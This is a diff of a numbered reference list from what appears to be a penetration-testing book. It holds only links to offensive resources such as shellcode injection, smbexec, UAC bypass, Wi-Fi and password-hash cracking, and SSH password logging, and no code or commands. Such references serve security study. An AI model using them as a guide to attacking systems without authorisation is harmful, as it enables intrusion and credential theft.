-17 [`www.pentestgeek.com/2013/09/18/invoke-shellcode/`](http://www.pentestgeek.com/2013/09/18/invoke-shellcode/)
-
-18 [`www.irongeek.com/i.php?page=videos/derbycon3/1209-living-off-the-land-a-minimalist-s-guide-to-windows-post-exploitation-christopher-campbell-matthew-graeber`](http://www.irongeek.com/i.php?page=videos/derbycon3/1209-living-off-the-land-a-minimalist-s-guide-to-windows-post-exploitation-christopher-campbell-matthew-graeber)
-
-19 [`www.labofapenetrationtester.com/2012/08/introducing-nishang-pow-ereshell-for.html`](http://www.labofapenetrationtester.com/2012/08/introducing-nishang-pow-ereshell-for.html)
-
-20 [`www.jessecole.org/2011/12/03/ssh-password-logging/`](http://www.jessecole.org/2011/12/03/ssh-password-logging/)
-
-21 [`www.securepla.net/doppelganging-your-ssh-server/`](http://www.securepla.net/doppelganging-your-ssh-server/)
-
-22 [`github.com/obscuresec/shmoocon/blob/master/PowerShellOfficeMacro`](http://github.com/obscuresec/shmoocon/blob/master/PowerShellOfficeMacro)
-
-23 [`bbs.archlinux.org/viewtopic.php?id=51548`](http://bbs.archlinux.org/viewtopic.php?id=51548)
-
-24 [`hashcat.net/wiki/doku.php?id=cracking_wpawpa2`](http://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
-
-25 [`hashcat.net/wiki/doku.php?id=cracking_wpawpa2`](http://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
-
-26 [`en.wikipedia.org/wiki/Wi-Fi_Protected_Setup`](http://en.wikipedia.org/wiki/Wi-Fi_Protected_Setup)
-
-27 [`www.kb.cert.org/vuls/id/723755`](http://www.kb.cert.org/vuls/id/723755)
-
-28 [`www.willhackforsushi.com/?page_id=37`](http://www.willhackforsushi.com/?page_id=37)
-
-29 [`www.youtube.com/watch?v=8BiOPBsXh0g#t=163`](http://www.youtube.com/watch?v=8BiOPBsXh0g#t=163)
-
-30 [`blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashed-passwords`](http://blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashed-passwords)
-
-31 [`contest-2010.korelogic.com/rules.html`](http://contest-2010.korelogic.com/rules.html)
-
-32 [`www.trustedsec.com/december-2010/bypass-windows-uac/`](http://www.trustedsec.com/december-2010/bypass-windows-uac/)
-
-33 [`wiki.tekkies.co.uk/General_Technical#FTP_using_xp_cmdshell_-_sql2k`](http://wiki.tekkies.co.uk/General_Technical#FTP_using_xp_cmdshell_-_sql2k)
-
-34 [`www.rootkitanalytics.com/userland/Exploring-Alternate-Data-Streams.php`](http://www.rootkitanalytics.com/userland/Exploring-Alternate-Data-Streams.php)
-
-35 [`www.youtube.com/watch?v=U34PpkZ5cQ8`](http://www.youtube.com/watch?v=U34PpkZ5cQ8)
-
-36 [`www.irongeek.com/i.php?page=videos/derbycon3/4206-windows-0wn3d-by-default-mark-baggett`](http://www.irongeek.com/i.php?page=videos/derbycon3/4206-windows-0wn3d-by-default-mark-baggett)
+1. [`mashable.com/2013/12/09/anonymous-attack-fine/`](http://mashable.com/2013/12/09/anonymous-attack-fine/)
+2. [`krebsonsecurity.com/2013/10/adobe-breach-impacted-at-least-38-million-users/`](http://krebsonsecurity.com/2013/10/adobe-breach-impacted-at-least-38-million-users/)
+3. [`community.rapid7.com/community/infosec/sonar/blog/2013/10/30/project-sonar-one-month-later`](http://community.rapid7.com/community/infosec/sonar/blog/2013/10/30/project-sonar-one-month-later)
+4. [`pauldotcom.com/wiki/index.php/Episode291`](http://pauldotcom.com/wiki/index.php/Episode291)
 
 
 
+## 参考链接
 
+5. [`www.offensive-security.com/metasploit-unleashed/Building_A_Module`](http://www.offensive-security.com/metasploit-unleashed/Building_A_Module)
 
-37 [`www.offensive-security.com/offsec/penetration-test-report-2013/`](http://www.offensive-security.com/offsec/penetration-test-report-2013/)
+6. [`www.exploit-db.com/exploits/27277/`](http://www.exploit-db.com/exploits/27277/)
 
+7. [`msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx`](http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx)
+
+8. [`pastebin.com/TE3fvhEh`](http://pastebin.com/TE3fvhEh)
+
+9. [`www.trustedsec.com/files/BSIDESLV_Secret_Pentesting_Techniques.pdf`](http://www.trustedsec.com/files/BSIDESLV_Secret_Pentesting_Techniques.pdf)
+
+10. [`http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences`](http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences)
+
+11. [`www.ampliasecurity.com/research/wcefaq.html`](http://www.ampliasecurity.com/research/wcefaq.html)
+
+12. [`http://www.room362.com/blog/2011/9/6/post-exploitation-command-lists.html`](http://www.room362.com/blog/2011/9/6/post-exploitation-command-lists.html)
+
+13. [`www.irongeek.com/i.php?page=videos/derbycon3/s106-owning-computers-without-shell-access-royce-davis`](http://www.irongeek.com/i.php?page=videos/derbycon3/s106-owning-computers-without-shell-access-royce-davis)
+
+14. [`www.defcon.org/images/defcon-21/dc-21-presentations/Milam/DEFCON-21-Milam-Getting-The-Goods-With-smbexec-Updated.pdf`](http://www.defcon.org/images/defcon-21/dc-21-presentations/Milam/DEFCON-21-Milam-Getting-The-Goods-With-smbexec-Updated.pdf)
+
+15. [`github.com/brav0hax/smbexec`](http://github.com/brav0hax/smbexec)
+
+16. [`raw.github.com/obscuresec/random/master/StartListener.py`](http://raw.github.com/obscuresec/random/master/StartListener.py)
+
+17. [`www.pentestgeek.com/2013/09/18/invoke-shellcode/`](http://www.pentestgeek.com/2013/09/18/invoke-shellcode/)
+
+18. [`www.irongeek.com/i.php?page=videos/derbycon3/1209-living-off-the-land-a-minimalist-s-guide-to-windows-post-exploitation-christopher-campbell-matthew-graeber`](http://www.irongeek.com/i.php?page=videos/derbycon3/1209-living-off-the-land-a-minimalist-s-guide-to-windows-post-exploitation-christopher-campbell-matthew-graeber)
+
+19. [`www.labofapenetrationtester.com/2012/08/introducing-nishang-pow-ereshell-for.html`](http://www.labofapenetrationtester.com/2012/08/introducing-nishang-pow-ereshell-for.html)
+
+20. [`www.jessecole.org/2011/12/03/ssh-password-logging/`](http://www.jessecole.org/2011/12/03/ssh-password-logging/)
+
+21. [`www.securepla.net/doppelganging-your-ssh-server/`](http://www.securepla.net/doppelganging-your-ssh-server/)
+
+22. [`github.com/obscuresec/shmoocon/blob/master/PowerShellOfficeMacro`](http://github.com/obscuresec/shmoocon/blob/master/PowerShellOfficeMacro)
+
+23. [`bbs.archlinux.org/viewtopic.php?id=51548`](http://bbs.archlinux.org/viewtopic.php?id=51548)
+
+24. [`hashcat.net/wiki/doku.php?id=cracking_wpawpa2`](http://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
+
+25. [`hashcat.net/wiki/doku.php?id=cracking_wpawpa2`](http://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
+
+26. [`en.wikipedia.org/wiki/Wi-Fi_Protected_Setup`](http://en.wikipedia.org/wiki/Wi-Fi_Protected_Setup)
+
+27. [`www.kb.cert.org/vuls/id/723755`](http://www.kb.cert.org/vuls/id/723755)
+
+28. [`www.willhackforsushi.com/?page_id=37`](http://www.willhackforsushi.com/?page_id=37)
+
+29. [`www.youtube.com/watch?v=8BiOPBsXh0g#t=163`](http://www.youtube.com/watch?v=8BiOPBsXh0g#t=163)
+
+30. [`blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashed-passwords`](http://blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashed-passwords)
+
+31. [`contest-2010.korelogic.com/rules.html`](http://contest-2010.korelogic.com/rules.html)
+
+32. [`www.trustedsec.com/december-2010/bypass-windows-uac/`](http://www.trustedsec.com/december-2010/bypass-windows-uac/)
+
+33. [`wiki.tekkies.co.uk/General_Technical#FTP_using_xp_cmdshell_-_sql2k`](http://wiki.tekkies.co.uk/General_Technical#FTP_using_xp_cmdshell_-_sql2k)
+
+34. [`www.rootkitanalytics.com/userland/Exploring-Alternate-Data-Streams.php`](http://www.rootkitanalytics.com/userland/Exploring-Alternate-Data-Streams.php)
+
+35. [`www.youtube.com/watch?v=U34PpkZ5cQ8`](http://www.youtube.com/watch?v=U34PpkZ5cQ8)
+
+36. [`www.irongeek.com/i.php?page=videos/derbycon3/4206-windows-0wn3d-by-default-mark-baggett`](http://www.irongeek.com/i.php?page=videos/derbycon3/4206-windows-0wn3d-by-default-mark-baggett)
+
+37. [`www.offensive-security.com/offsec/penetration-test-report-2013/`](http://www.offensive-security.com/offsec/penetration-test-report-2013/)
